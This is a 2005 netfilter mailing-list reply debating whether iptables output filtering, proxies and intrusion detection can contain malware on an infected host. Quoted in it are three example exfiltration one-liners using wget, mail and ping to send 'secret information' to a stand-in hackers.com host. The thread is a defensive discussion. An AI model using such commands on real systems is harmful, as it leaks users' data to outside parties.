From: Nick Drage <nickd@metastasis.org.uk>
Subject: Re: Nice ZoneAlarm that might be useful for Iptables
Date: Sun, 19 Jun 2005 22:41:42 +0100
Message-ID: <20050619214142.GN3217@metastasis.org.uk>
References: <429BDF9F.7070707@mindspring.com>
	<20050531043310.GF3681@der-frank.org>
Mime-Version: 1.0
Return-path: <netfilter-bounces@lists.netfilter.org>
Content-Disposition: inline
In-Reply-To: <20050531043310.GF3681@der-frank.org>
List-Id: <netfilter.vger.kernel.org>
List-Unsubscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=unsubscribe>
List-Archive: </pipermail/netfilter>
List-Post: <mailto:netfilter@lists.netfilter.org>
List-Help: <mailto:netfilter-request@lists.netfilter.org?subject=help>
List-Subscribe: <https://lists.netfilter.org/mailman/listinfo/netfilter>,
	<mailto:netfilter-request@lists.netfilter.org?subject=subscribe>
Sender: netfilter-bounces@lists.netfilter.org
Errors-To: netfilter-bounces@lists.netfilter.org
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: netfilter@lists.netfilter.org

On Tue, May 31, 2005 at 06:33:10AM +0200, Frank Gruellich wrote:

> * Larry Alkoff <labradley@mindspring.com> 30. May 05:
> > [Zonealarm]
> > In addition, it will warn if a program is asking for server rights 
> > although and ask for approval to grant that, although I don't understand 
> > what they mean by "server rights".
> 
> AFAIK Zonealarm it means, that a program starts a server: it listens on
> a port.  For Unix it needs root priveleges to listen on ports below 1024
> (dunno about Windows).

AFAICT any program or user can open a socket on any port if it's not
already in use.

> > Most Iptables scripts I've seen do very little OUTPUT filtering
> > which means a malicious program, if it got access somehow, could
> > have free range to send packets out.  Zombie or spyware perhaps.
> 
> While OUTPUT has nothing to do with servers, it is simply impossible.
> You can't protect an infected host.

Of course you can.

If the firewall is on the local machine you could configure that
firewall to restrict inbound and outbound traffic.  If the malware
doesn't have root, or doesn't have the ability to turn off firewalling,
then it can't do anything on the network, or can't be reached from the
network.

If the firewall is on a gateway with a pretty hardcore egress filter,
say nothing direct allowed out, all web traffic goes through a proxy
and all email goes through the local server, then again its a lot harder
for that malware to do anything if its payload involves Internet
connectivity.

> > The ability to block this by only allowing "approved" programs to access 
> > the Internet would be a nice addition to Iptables.
> 
> Define "access the Internet".  There will be some hundreds of ways for
> malware to send data you can't even catch with iptables.  There are some
> more dozens of ways you can't block at all.  How do you intend to catch
> 
>  $ wget 'http://www.hackers.com/script.php?info=this%20is%20my%20very%20secret%20information'

Use a proxy?

>  $ echo "this is the very secret information" |mail -s "$USER@`hostname -f`" jr@hackers.com

A mail server or Network IDS set to pick up on the terms used in such
secret information.

>  $ ping -c1 www.this.is.my.very.secret.information.hackers.com

Stop ICMP ping outbound?  Why would that be needed by normal users?

You can't completely block malware from accessing the Internet, but you
can make it really, really difficult...

-- 
If at first you don't succeed, destroy all the evidence that you tried.

